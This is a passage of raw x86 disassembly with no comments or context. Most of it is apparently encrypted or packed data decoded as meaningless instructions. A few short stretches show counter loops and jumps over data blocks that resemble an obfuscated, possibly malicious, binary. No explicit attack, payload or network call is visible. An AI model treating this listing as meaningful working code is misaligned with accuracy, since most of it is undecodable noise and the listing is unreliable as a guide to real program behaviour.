  411fc9:	shr    DWORD PTR cs:[eax],1
  411fcc:	cmc    
  411fcd:	test   eax,0x26a6ccb3
  411fd2:	imul   ebp,ecx,0x1097507c
  411fd8:	es data16 cs jae 0x412008
  411fdd:	push   edx
  411fde:	in     eax,0x74
  411fe0:	mov    eax,0x636461ed
  411fe5:	out    0xaa,al
  411fe7:	inc    ecx
  411fe8:	popf   
  411fe9:	mov    eax,ds:0x4d7f9921
  411fee:	pop    eax
  411fef:	test   BYTE PTR [edi+eiz*1+0x32],ah
  411ff3:	iret   
  411ff4:	mov    ?,WORD PTR [ecx+0x5]
  411ff7:	dec    ebx
  411ff8:	shr    ch,0x38
  411ffb:	int    0x14
  411ffd:	sbb    eax,esi
  411fff:	sub    ecx,DWORD PTR [edx-0x365ca2c1]
  412005:	shl    DWORD PTR [ebp+0x65],0xdb
  412009:	sbb    eax,0xbf953367
  41200e:	mov    ds,ecx
  412010:	sub    al,0xbe
  412012:	stc    
  412013:	or     eax,0x8688be11
  412018:	into   
  412019:	push   ds
  41201a:	cs pop edi
  41201c:	scas   al,BYTE PTR es:[edi]
  41201d:	ss in  al,0xdb
  412020:	out    dx,al
  412021:	daa    
  412022:	fs fst st(3)
  412025:	mov    edx,0xf7603491
  41202a:	push   edx
  41202b:	sbb    ch,BYTE PTR [eax+0x4b]
  41202e:	mov    ds:0x6b238558,al
  412033:	mov    WORD PTR [eax-0x37],ss
  412036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412037:	mov    ah,0x24
  412039:	and    DWORD PTR [edi-0x3b],ecx
  41203c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41203d:	and    dl,BYTE PTR [edx+0x6a]
  412040:	data16 adc al,0x28
  412043:	cmp    esi,DWORD PTR [ebx]
  412045:	out    0x12,al
  412047:	xor    al,0x90
  412049:	sbb    eax,0xf2ba7ea9
  41204e:	add    DWORD PTR ds:0x6aef3a04,esi
  412054:	pushf  
  412055:	mov    al,0xa1
  412057:	ins    DWORD PTR es:[edi],dx
  412058:	push   0xffffffdc
  41205a:	adc    DWORD PTR [ebx+0x33],edi
  41205d:	sub    al,0x7
  41205f:	mov    ebx,DWORD PTR fs:[esi-0x10b54255]
  412066:	mov    esi,0x858ee679
  41206b:	mov    bl,0xd8
  41206d:	jne    0x41208a
  41206f:	sub    BYTE PTR [edi+0x5e3690e1],bl
  412075:	pop    ebx
  412076:	add    BYTE PTR [eax+0x1d9af998],al
  41207c:	and    al,ah
  41207e:	push   edx
  41207f:	jnp    0x41203a
  412081:	popf   
  412082:	icebp  
  412083:	push   ds
  412084:	pop    esp
  412085:	(bad)  [ecx+0x49c5ec9b]
  41208b:	adc    al,0xb2
  41208d:	push   ebx
  41208e:	xor    edx,DWORD PTR [esi-0x2c1a4b17]
  412094:	cdq    
  412095:	dec    ecx
  412096:	pop    edx
  412097:	test   eax,0xed4db420
  41209c:	mov    ah,ch
  41209e:	aam    0xb7
  4120a0:	leave  
  4120a1:	add    esi,ebp
  4120a3:	pop    ss
  4120a4:	add    BYTE PTR [eax],0x2e
  4120a7:	mov    bl,0x3a
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	jmp    0x46de0fe3
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x1470707e
  41217a:	pop    esi
  41217b:	jmp    DWORD PTR [edx]
  41217d:	cmp    bh,BYTE PTR [esi-0x7819e2c4]
  412183:	add    BYTE PTR [ebx],0x9f
  412186:	inc    ch
  412188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412189:	mov    esi,0xc7d52fc5
  41218e:	rol    ch,cl
  412190:	add    al,BYTE PTR [ecx+ebx*2]
  412193:	pop    ecx
  412194:	mov    ds:0x8e30e9f5,eax
  412199:	ja     0x4121dc
  41219b:	and    eax,0x883de122
  4121a0:	push   ebx
  4121a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121a2:	adc    eax,0xcb8ebdc2
  4121a7:	out    dx,al
  4121a8:	je     0x4121dd
  4121aa:	sti    
  4121ab:	cmp    eax,0xb10d541e
  4121b0:	mov    dl,bh
  4121b2:	inc    BYTE PTR [eax]
  4121b4:	ss xor eax,0x7d55ede
  4121ba:	dec    edi
  4121bb:	lock xchg ecx,eax
  4121bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121be:	push   es
  4121bf:	repz xchg esi,eax
  4121c1:	test   BYTE PTR [ecx-0x6a],0xb1
  4121c5:	mov    edi,0x2f2dea47
  4121ca:	idiv   BYTE PTR [edx]
  4121cc:	xchg   edi,eax
  4121cd:	ins    DWORD PTR es:[edi],dx
  4121ce:	retf   
  4121cf:	lea    ebx,[edx+0x1f]
  4121d2:	out    0x37,eax
  4121d4:	inc    edx
  4121d5:	outs   dx,BYTE PTR ds:[esi]
  4121d6:	fsub   QWORD PTR [ebx]
  4121d8:	call   0x34541312
  4121dd:	mov    bh,0xc3
  4121df:	xor    BYTE PTR [esi+0x4b],dl
  4121e2:	jle    0x412173
  4121e4:	iret   
  4121e5:	cdq    
  4121e6:	pushf  
  4121e7:	pop    edi
  4121e8:	mov    DWORD PTR [ebp+0x51a6a7b4],ebp
  4121ee:	cmp    ch,BYTE PTR [eax+0x12cf38f1]
  4121f4:	push   ss
  4121f5:	xor    al,0x2a
  4121f7:	mov    ah,0x9
  4121f9:	mov    esp,0x265aabb
  4121fe:	jmp    0x412212
  412200:	push   es
  412201:	fild   WORD PTR [edx+0x70]
  412204:	icebp  
  412205:	aas    
  412206:	jmp    0x412214
  412208:	jle    0x41219f
  41220a:	mov    ss,eax
  41220c:	fs pop edi
  41220e:	sahf   
  41220f:	cmp    DWORD PTR [edx+eiz*1],0xba84af0e
  412216:	mov    ebp,0x9bde4a05
  41221b:	add    bh,BYTE PTR [edx+0x8d7057d]
  412221:	scas   al,BYTE PTR es:[edi]
  412222:	sub    dh,BYTE PTR [esi+ebx*4+0x65a0e270]
  412229:	push   ebx
  41222a:	fs lock hlt 
  41222d:	lock jecxz 0x412231
  412230:	in     eax,0x9f
  412232:	sahf   
  412233:	popf   
  412234:	fsub   st,st(1)
  412236:	lahf   
  412237:	push   0x91f363fa
  41223c:	das    
  41223d:	shr    BYTE PTR [ecx],cl
  41223f:	test   eax,0xf34db456
  412244:	xchg   edx,eax
  412245:	or     DWORD PTR [ecx+0x70],eax
  412248:	pusha  
  412249:	add    al,BYTE PTR [ebx]
  41224b:	test   eax,0x294ea1c5
  412251:	pop    esi
  412252:	and    dl,bh
  412254:	popf   
  412255:	dec    edi
  412256:	jmp    0xd8af:0xcb974b50
  41225d:	xor    eax,0xb1e32c0d
  412262:	xchg   edx,eax
  412263:	cmc    
  412264:	push   edi
  412265:	adc    DWORD PTR [ecx],ecx
  412267:	mov    ecx,0x7e1b63b8
  41226c:	sub    esi,DWORD PTR ds:0x64a760b7
  412272:	imul   edx,DWORD PTR [ecx-0x63],0xffffffb9
  412276:	push   ebp
  412277:	inc    esi
  412278:	lock (bad) 
  41227a:	outs   dx,BYTE PTR ds:[esi]
  41227b:	jmp    FWORD PTR [ebx+0x67]
  41227e:	out    dx,al
  41227f:	je     0x4122f2
  412281:	imul   esi,DWORD PTR [ebp-0x24c90742],0xffffffe1
  412288:	scas   eax,DWORD PTR es:[edi]
  412289:	stos   DWORD PTR es:[edi],eax
  41228a:	or     dl,ch
  41228c:	pushf  
  41228d:	mov    ecx,0x21054c51
  412292:	mov    edi,0x8e085e52
  412297:	xchg   edi,eax
  412298:	xor    BYTE PTR [ecx+edi*1-0x5a15d92b],al
  41229f:	iret   
  4122a0:	ret    
  4122a1:	cmp    al,0x54
  4122a3:	scas   al,BYTE PTR es:[edi]
  4122a4:	jbe    0x4122c7
  4122a6:	aas    
  4122a7:	repz add al,0xf3
  4122aa:	jo     0x4122c2
  4122ac:	fcmovne st,st(7)
  4122ae:	and    bh,bl
  4122b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122b1:	sbb    DWORD PTR ds:0x3179f472,ebp
  4122b7:	mov    ch,BYTE PTR [esi+0x7e9ec956]
  4122bd:	mov    dh,BYTE PTR [ecx+0x496ae191]
  4122c3:	pop    eax
  4122c4:	pop    ds
  4122c5:	cmp    eax,0x35b90813
  4122ca:	sbb    BYTE PTR [edi],ah
  4122cc:	in     al,0xad
  4122ce:	add    al,0x9f
  4122d0:	xor    al,0xca
  4122d2:	fild   WORD PTR [esi+ebp*2+0x2a]
  4122d6:	lods   eax,DWORD PTR ds:[esi]
  4122d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122d8:	les    ebp,FWORD PTR ds:0x69e6f57c
  4122de:	retf   
  4122df:	dec    eax
  4122e0:	imul   ecx,DWORD PTR [edi-0x21],0xffffff83
  4122e4:	xchg   bx,ax
  4122e6:	aas    
  4122e7:	xchg   BYTE PTR [ecx+eax*2+0x43],bh
  4122eb:	jecxz  0x41232e
  4122ed:	cmp    al,BYTE PTR [eax+0x3873fe9a]
  4122f3:	js     0x4122de
  4122f5:	cdq    
  4122f6:	mov    ebx,DWORD PTR [edx]
  4122f8:	arpl   WORD PTR [ebx],ax
  4122fa:	mov    esi,0x93b72d2d
  4122ff:	(bad)  
  412300:	xchg   edx,eax
  412301:	inc    esi
  412302:	push   ss
  412303:	xor    DWORD PTR [ebx+0x32],eax
  412306:	mov    al,ds:0x54673b98
  41230b:	mov    cl,0x6e
  41230d:	and    al,0x32
  41230f:	dec    edi
  412310:	fsubr  QWORD PTR [edx]
  412312:	mov    edx,0x4a256319
  412317:	pushf  
  412318:	aas    
  412319:	add    ebx,DWORD PTR ds:0xdb138f79
  41231f:	add    eax,0x26196100
  412324:	cmp    ebp,DWORD PTR [edx+0x3c]
  412327:	push   ds
  412328:	dec    ecx
  412329:	mov    ah,0x68
  41232b:	imul   ebx,DWORD PTR ds:0x573988fa,0xe08478f
  412335:	pop    es
  412336:	push   0xc57600a7
  41233b:	fwait
  41233c:	les    eax,FWORD PTR [edi]
  41233e:	call   0xc4e9985
  412343:	ja     0x4122ea
  412345:	dec    eax
  412346:	or     BYTE PTR [eax+0x5b7ddbac],cl
  41234c:	stos   BYTE PTR es:[edi],al
  41234d:	mov    al,0x5c
  41234f:	shr    DWORD PTR [esi+0x38],1
  412352:	mov    ebp,0x558c8ca9
  412357:	stos   DWORD PTR es:[edi],eax
  412358:	repz mov es,ebx
  41235b:	scas   al,BYTE PTR es:[edi]
  41235c:	xchg   BYTE PTR [ebp-0x49],bh
  41235f:	lahf   
  412360:	mov    ds:0xc16937a9,eax
  412365:	xchg   esi,eax
  412366:	stos   DWORD PTR es:[edi],eax
  412367:	or     BYTE PTR [ebx-0x1943edd8],ch
  41236d:	mov    al,ah
  41236f:	xchg   ebp,eax
  412370:	dec    edi
  412371:	ret    0x45b0
  412374:	inc    esi
  412375:	mov    ds:0xaf68e43c,al
  41237a:	icebp  
  41237b:	cli    
  41237c:	dec    eax
  41237d:	push   eax
  41237e:	(bad)  
  41237f:	loopne 0x41235b
  412381:	xchg   ecx,eax
  412382:	js     0x412373
  412384:	xchg   bh,ch
  412386:	mov    eax,0x95db4267
  41238b:	shl    edi,1
  41238d:	pop    eax
  41238e:	jle    0x412409
  412390:	faddp  st(4),st
  412392:	inc    eax
  412393:	ret    
  412394:	mov    ds:0xc2c7eb47,eax
  412399:	push   es
  41239a:	dec    esi
  41239b:	neg    bh
  41239d:	pop    ebx
  41239e:	test   BYTE PTR [ecx-0x574e6da8],dh
  4123a4:	dec    ebx
  4123a5:	out    0x59,al
  4123a7:	leave  
  4123a8:	scas   al,BYTE PTR es:[edi]
  4123a9:	push   ecx
  4123aa:	push   ecx
  4123ab:	mov    dl,0xdd
  4123ad:	cdq    
  4123ae:	and    DWORD PTR [ebp-0x6dde1153],edi
  4123b4:	pop    edx
  4123b5:	xor    dl,0x7d
  4123b8:	mov    bh,0xb4
  4123ba:	push   ecx
  4123bb:	pop    es
  4123bc:	(bad)  
  4123bd:	cs mov edi,0xcf6d64fc
  4123c3:	cmp    al,0xb0
  4123c5:	jne    0x4123e6
  4123c7:	cmp    esi,DWORD PTR [ebp+0x2dab04df]
  4123cd:	mov    ebx,0xf07aad4d
  4123d2:	fcomi  st,st(2)
  4123d4:	scas   eax,DWORD PTR es:[edi]
  4123d5:	addr16 mov ds:0xf71d,al
  4123d9:	pop    ss
  4123da:	rol    BYTE PTR [edi-0x7305d9ed],0x8b
  4123e1:	inc    ebx
  4123e2:	mov    ah,0x5a
  4123e4:	iret   
  4123e5:	inc    esp
  4123e6:	sbb    eax,0xf9cda7c5
  4123eb:	lds    esp,FWORD PTR [esi]
  4123ed:	jp     0x412402
  4123ef:	inc    esp
  4123f0:	cli    
  4123f1:	sbb    al,0xc4
  4123f3:	xor    DWORD PTR [edi+0x67],0xffffffae
  4123f7:	loope  0x4123f2
  4123f9:	inc    edx
  4123fa:	(bad)  
  4123fc:	sub    al,0xaa
  4123fe:	add    ch,BYTE PTR [ecx-0x3b45ef68]
  412404:	cmp    DWORD PTR [edx-0x48a255e7],esp
  41240a:	jns    0x412439
  41240c:	xor    eax,0x995ba6c8
  412411:	adc    eax,0x87dc80e1
  412416:	sub    ebx,0x5f592408
  41241c:	add    dh,BYTE PTR ds:0x6bb33338
  412422:	dec    edi
  412423:	push   ecx
  412424:	into   
  412425:	repz imul ecx,DWORD PTR [ebp+0x35],0xa3217086
  41242d:	pop    edx
  41242e:	les    ebx,FWORD PTR [esi+eiz*1-0x1d8f26dc]
  412435:	sub    bh,cl
  412437:	jns    0x41244b
  412439:	shr    BYTE PTR ds:0x196e46ca,0x16
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	pushf  
  41245e:	xor    DWORD PTR [eax+0x705c8fef],0x70
  412465:	mov    ecx,0xe470707e
  41246a:	or     al,0xd9
  41246c:	daa    
  41246d:	in     al,dx
  41246e:	int    0xc4
  412470:	add    DWORD PTR [ebx],esi
  412472:	push   eax
  412473:	or     al,0x4e
  412475:	ins    BYTE PTR es:[edi],dx
  412476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412477:	out    0x4,al
  412479:	inc    edx
  41247a:	test   DWORD PTR [ebp-0x6f],ebx
  41247d:	test   al,ah
  41247f:	cli    
  412480:	mov    ecx,0xcf5ebc75
  412485:	push   es
  412486:	sub    DWORD PTR [esi-0x47],edi
  412489:	test   DWORD PTR [eax-0x15],esp
  41248c:	sbb    eax,DWORD PTR [eax+0x26]
  41248f:	enter  0x50f,0x47
  412493:	dec    edi
  412494:	xor    ch,BYTE PTR [edi-0x454128e3]
  41249a:	rol    BYTE PTR [ecx],0xaf
  41249d:	cli    
  41249e:	in     eax,dx
  41249f:	lods   eax,DWORD PTR ds:[esi]
  4124a0:	adc    cl,bl
  4124a2:	xor    al,0xde
  4124a4:	jns    0x412475
  4124a6:	mov    WORD PTR [ecx],fs
  4124a8:	and    BYTE PTR [ecx+0x34b2b2e4],ch
  4124ae:	inc    ecx
  4124af:	(bad)  
  4124b0:	pop    eax
  4124b1:	xor    ebx,ecx
  4124b3:	test   eax,0x8894b7b0
  4124b8:	mov    eax,0x4ac9bff6
  4124bd:	mov    bl,0xdf
  4124bf:	out    dx,al
  4124c0:	push   0xffffffb3
  4124c2:	mov    esp,0x57d93c9a
  4124c7:	mov    ebx,DWORD PTR ds:0xdc29d11
  4124cd:	pop    ecx
  4124ce:	jb     0x412486
  4124d0:	sub    al,0x33
  4124d2:	jcxz   0x4124b6
  4124d5:	imul   ecx,ebx,0x21
  4124d8:	jl     0x4124a5
  4124da:	or     al,ah
  4124dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124dd:	lock outs dx,BYTE PTR ds:[esi]
  4124df:	sti    
  4124e0:	fild   DWORD PTR [edx+eiz*1-0x5583bf27]
  4124e7:	pop    ebx
  4124e8:	jbe    0x4124db
  4124ea:	adc    cl,0x1a
  4124ed:	inc    ebp
  4124ee:	push   ds
  4124ef:	pushf  
  4124f0:	or     al,0x6f
  4124f2:	imul   eax,DWORD PTR [eax],0xfffffffc
  4124f5:	jns    0x4124b9
  4124f7:	jne    0x4124bb
  4124f9:	in     eax,0x87
  4124fb:	mov    bh,0x83
  4124fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124fe:	xor    esi,DWORD PTR ds:[ebp+0x43f646a7]
  412505:	scas   al,BYTE PTR es:[edi]
  412506:	sbb    al,0x43
  412508:	cmp    eax,0xf13f4331
  41250d:	lods   al,BYTE PTR ds:[esi]
  41250e:	fs test al,0x49
  412511:	in     al,0x7
  412513:	mov    ecx,0x6d7e3e64
  412518:	and    al,0x80
  41251a:	mov    ch,0xb6
  41251c:	mov    ?,esi
  41251e:	rcl    BYTE PTR [edx+0x72],cl
  412521:	push   edx
  412522:	arpl   dx,bx
  412524:	mov    ah,0x13
  412526:	sbb    esp,DWORD PTR [esi+0x24]
  412529:	ret    0x4780
  41252c:	(bad)  
  41252d:	jecxz  0x4124f6
  41252f:	jmp    0xffd2223a
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	mov    ebp,0xd2df92a8
  41253a:	in     al,dx
  41253b:	ror    ebp,cl
  41253d:	(bad)  
  41253e:	push   0xffffffc2
  412540:	inc    ebp
  412541:	sar    DWORD PTR [edi],0xb
  412544:	ret    
  412545:	add    eax,0x7d549c16
  41254a:	jg     0x412538
  41254c:	add    BYTE PTR [ebx+eax*8-0x661c9750],0xb3
  412554:	test   esi,esi
  412556:	cdq    
  412557:	and    eax,0x43c18f18
  41255c:	(bad)  
  41255d:	pushf  
  41255e:	call   FWORD PTR [esi-0x80]
  412561:	fmul   QWORD PTR ds:0xc3a47f05
  412567:	sub    esp,ebx
  412569:	bnd jp 0x412576
  41256c:	sti    
  41256d:	dec    esp
  41256e:	or     BYTE PTR [eax+0x3],bh
  412571:	shl    eax,0x96
  412574:	dec    esp
  412575:	inc    ecx
  412576:	inc    ebp
  412577:	or     eax,edi
  412579:	mov    edx,0xc45cbf43
  41257e:	sbb    BYTE PTR [ebx],0x73
  412581:	test   DWORD PTR [edx-0x6fc777a9],0xc1cfeced
  41258b:	jae    0x4125c1
  41258d:	retf   
  41258e:	or     dh,BYTE PTR [ebp-0x50e73576]
  412594:	push   edx
  412595:	pop    esi
  412596:	mov    ebp,0x4fb9fe1e
  41259b:	jl     0x412524
  41259d:	loop   0x41260e
  41259f:	mov    esp,DWORD PTR [eax+0x1f]
  4125a2:	pushf  
  4125a3:	(bad)  
  4125a4:	pop    ebx
  4125a5:	and    eax,0xcb2b5ba8
  4125aa:	fisttp DWORD PTR [esp+eax*8-0x7e]
  4125ae:	sbb    DWORD PTR [eax],esp
  4125b0:	cdq    
  4125b1:	ret    
  4125b2:	popa   
  4125b3:	xchg   bl,ah
  4125b5:	ret    
  4125b6:	push   edx
  4125b7:	xchg   edx,eax
  4125b8:	dec    edi
  4125b9:	mov    ecx,0xd9f996c4
  4125be:	(bad)  
  4125bf:	jle    0x4125e1
  4125c1:	pusha  
  4125c2:	dec    edi
  4125c3:	xchg   esi,eax
  4125c4:	cs mov cl,0x4a
  4125c7:	retf   
  4125c8:	xchg   ecx,eax
  4125c9:	out    0x23,al
  4125cb:	xchg   edi,eax
  4125cc:	pop    ss
  4125cd:	push   0x5b5eef5b
  4125d2:	and    bl,al
  4125d4:	loopne 0x412631
  4125d6:	pop    ss
  4125d7:	pushf  
  4125d8:	pop    es
  4125d9:	cmp    cl,BYTE PTR [ebx-0x33]
  4125dc:	ja     0x41257b
  4125de:	pop    ebx
  4125df:	repz adc BYTE PTR [edx+0x58d7d43c],dl
  4125e6:	repnz sbb al,0x34
  4125e9:	sbb    eax,0xd5ed9cdb
  4125ee:	cmp    ecx,DWORD PTR [eax-0x76bedf77]
  4125f4:	mov    edx,0xff0d7b32
  4125f9:	dec    ebp
  4125fa:	mov    DWORD PTR [edi+0x1f],esp
  4125fd:	loopne 0x412608
  4125ff:	loopne 0x4125a1
  412601:	mov    al,ds:0x7b745927
  412606:	and    DWORD PTR [ecx],ebp
  412608:	shl    ecx,0x6c
  41260b:	dec    eax
  41260c:	inc    edx
  41260d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41260e:	inc    ebp
  41260f:	and    al,dh
  412611:	sub    al,BYTE PTR [eax-0x6efc9fe0]
  412617:	push   edi
  412618:	adc    DWORD PTR [edi],ecx
  41261a:	mov    eax,ds:0x9b356a70
  41261f:	mov    ah,0xf1
  412621:	into   
  412622:	into   
  412623:	xor    esp,DWORD PTR [ebx-0x1b]
  412626:	adc    ecx,ebx
  412628:	loopne 0x4125f5
  41262a:	in     al,dx
  41262b:	lods   al,BYTE PTR ds:[esi]
  41262c:	test   eax,0xa884f9a4
  412631:	loop   0x4126a3
  412633:	mov    ebp,0xf4d5e464
  412638:	scas   eax,DWORD PTR es:[edi]
  412639:	ret    0xe9ab
  41263c:	cwde   
  41263d:	das    
  41263e:	xor    ebp,eax
  412640:	jmp    0xf370:0xc169eb3a
  412647:	fwait
  412648:	(bad)  
  412649:	dec    esi
  41264a:	inc    BYTE PTR [eax]
  41264c:	inc    eax
  41264d:	arpl   bx,ax
  41264f:	mov    bh,0x1c
  412651:	dec    esp
  412652:	outs   dx,BYTE PTR ds:[esi]
  412653:	push   edi
  412654:	cld    
  412655:	lods   al,BYTE PTR ds:[esi]
  412656:	shl    BYTE PTR [edx],cl
  412658:	inc    eax
  412659:	pop    ds
  41265a:	nop
  41265b:	inc    edi
  41265c:	add    DWORD PTR [ecx+0x5d],esi
  41265f:	cmp    BYTE PTR [ecx+0xbd2ca75],bh
  412665:	xor    al,0xab
  412667:	mov    bl,BYTE PTR [ecx-0x7e2f0d2e]
  41266d:	dec    edx
  41266e:	jae    0x41260c
  412670:	dec    ebx
  412671:	inc    ebx
  412672:	retf   
  412673:	and    cl,BYTE PTR [edx-0x173c2cd6]
  412679:	xor    al,al
  41267b:	sub    edx,DWORD PTR [ecx+0x6432db44]
  412681:	xchg   ebx,eax
  412682:	adc    bh,ah
  412684:	cld    
  412685:	mov    ebp,0x636a5f25
  41268a:	addr16 push 0x2b048a70
  412690:	and    edi,DWORD PTR [eax-0x6720ee46]
  412696:	std    
  412697:	jo     0x41270c
  412699:	ret    
  41269a:	out    dx,eax
  41269b:	mov    ds:0x9947f2de,eax
  4126a0:	sar    DWORD PTR [esi+0x230deaf3],0x20
  4126a7:	push   edx
  4126a8:	mov    bl,0x3e
  4126ab:	cmp    bh,bh
  4126ad:	or     DWORD PTR [edx],esi
  4126af:	push   eax
  4126b0:	mov    al,ds:0xc18455a
  4126b5:	mov    bl,0x5e
  4126b7:	push   esp
  4126b8:	or     eax,0x6a7b398
  4126bd:	sbb    al,BYTE PTR [edx]
  4126bf:	(bad)  
  4126c1:	das    
  4126c2:	icebp  
  4126c3:	repnz loope 0x4126b7
  4126c6:	xchg   ecx,eax
  4126c7:	inc    edi
  4126c8:	mov    al,ds:0x7bbcf669
  4126cd:	pop    esp
  4126ce:	mov    ebp,0x44c93176
  4126d3:	add    al,0x9e
  4126d5:	cmp    al,0xd0
  4126d7:	pop    ss
  4126d8:	(bad)  
  4126d9:	cld    
  4126da:	gs inc ecx
  4126dc:	mov    cl,0xc3
  4126de:	pop    DWORD PTR [ebx-0x28cd1ce7]
  4126e4:	shl    BYTE PTR [edx-0x3d],0x71
  4126e8:	xchg   DWORD PTR [edx],edx
  4126ea:	in     al,0xc6
  4126ec:	pop    edx
  4126ed:	(bad)  
  4126ee:	jmp    0x7075:0x93381a14
  4126f5:	bound  ecx,QWORD PTR [edi+ebx*8]
  4126f8:	(bad)  
  4126fa:	aas    
  4126fb:	push   edx
  4126fc:	push   0xffffffa3
  4126fe:	fcomi  st,st(6)
  412700:	mov    bl,cl
  412702:	(bad)  
  412703:	in     al,0x9d
  412705:	xchg   ebx,eax
  412706:	pop    ss
  412707:	pop    esp
  412708:	adc    edx,DWORD PTR [ecx+0x7e]
  41270b:	xchg   edi,eax
  41270c:	dec    ecx
  41270d:	lock scas eax,DWORD PTR es:[edi]
  41270f:	mov    ecx,ss
  412711:	sbb    al,0xb3
  412713:	pop    edx
  412714:	cmp    esp,DWORD PTR [ebp+0x3d]
  412717:	mov    dh,0xd
  412719:	test   eax,0x10b1eac8
  41271e:	les    eax,FWORD PTR [eax-0x629781d]
  412724:	add    eax,DWORD PTR [edx-0x591bcb04]
  41272a:	and    eax,0xafeb9203
  41272f:	test   BYTE PTR [ecx+0x2581e44d],cl
  412735:	jbe    0x412734
  412737:	inc    edx
  412738:	add    BYTE PTR [eax],al
  41273a:	add    BYTE PTR [eax],al
  41273c:	add    cl,ch
  41273e:	sldt   WORD PTR [eax]
  412741:	add    BYTE PTR [ebx],dh
  412743:	leave  
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ecx,eax
  4127be:	enter  0xdc5c,0xc8
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0x3e70707e
  4127ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127cb:	or     cl,BYTE PTR [ecx]
  4127cd:	or     al,0xf0
  4127cf:	adc    eax,0xf6cbca16
  4127d4:	mov    bh,0x4
  4127d6:	add    DWORD PTR ds:0xc216da50,edi
  4127dc:	ret    0xba67
  4127df:	in     al,0x1
  4127e1:	sbb    al,0xc8
  4127e3:	fcom   QWORD PTR fs:[ebx+0x38]
  4127e7:	cld    
  4127e8:	dec    ecx
  4127e9:	mov    eax,0x60b0f4fd
  4127ee:	sbb    ah,bl
  4127f0:	fsub   st,st(1)
  4127f2:	cld    
  4127f3:	push   edi
  4127f4:	hlt    
  4127f5:	jnp    0x4127bb
  4127f7:	lock fbld TBYTE PTR [edi-0x240f4c34]
  4127fe:	cmp    eax,0x6d8144e2
  412803:	push   ds
  412804:	push   es
  412805:	(bad)  
  412806:	mul    DWORD PTR [esi+edi*1+0x5beaf2b8]
  41280d:	dec    ebx
  41280e:	into   
  41280f:	(bad)  
  412810:	test   DWORD PTR [ebx+0x47],ebx
  412813:	mov    ecx,0xb29974be
  412818:	pop    esp
  412819:	push   ebp
  41281a:	xor    ah,ah
  41281c:	es retf 0xbbdb
  412820:	mov    ds:0x366a6853,eax
  412825:	arpl   WORD PTR [eax-0x49],bx
  412828:	inc    esp
  412829:	lahf   
  41282a:	jmp    0x412817
  41282c:	inc    edx
  41282d:	mov    esp,0xcb24a631
  412832:	nop
  412833:	mov    ds:0x91dcf729,al
  412838:	clc    
  412839:	aaa    
  41283a:	jl     0x4127dd
